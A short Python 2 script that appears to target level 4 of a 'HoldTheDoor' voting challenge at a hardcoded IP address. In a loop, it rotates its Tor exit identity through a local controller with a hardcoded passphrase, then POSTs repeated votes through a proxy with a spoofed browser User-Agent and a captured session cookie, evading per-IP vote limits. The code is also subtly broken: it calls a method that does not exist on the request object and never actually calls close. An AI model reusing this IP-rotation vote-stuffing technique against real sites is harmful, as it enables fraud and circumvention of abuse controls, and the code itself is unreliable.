#!/usr/bin/python

from TorCtl import TorCtl
import httplib
import urllib, urllib2
from time import sleep

headers = {'Host': "54.221.6.249", 'User-Agent': "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0", 'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 'Accept-Language': "en-US,en;q=0.5", 'Referer': "http://54.221.6.249/level4.php", 'Cookie': "HoldTheDoor=9147ab4a14219563dcb5647dbff574e10dbfa529", 'Connection': "keep-alive"}

data = urllib.urlencode({'id': 28, 'holdthedoor': "Submit+Query", 'key': "9147ab4a14219563dcb5647dbff574e10dbfa529"})

def request(url):
    def set_urlproxy():
        proxy_support = urllib2.ProxyHandler({"http" : "127.0.0.1:8118"})
        opener = urllib2.build_opener(proxy_support)
        urllib2.install_opener(opener)
    set_urlproxy()
    try:
        c = urllib2.Request(url, data, headers)
        c.request('POST', url, data, headers)
        c.close
    except Exception, e:
        print e
        pass
    return (urllib2.urlopen(c).read())

def renew_connection():
    conn = TorCtl.connect(controlAddr="127.0.0.1", controlPort=9051, passphrase="shyro339")
    conn.send_signal("NEWNYM")
    conn.close()

for i in range(0, 28):
    renew_connection()
    sleep(20)
    print request("http://54.221.6.249/level4.php")
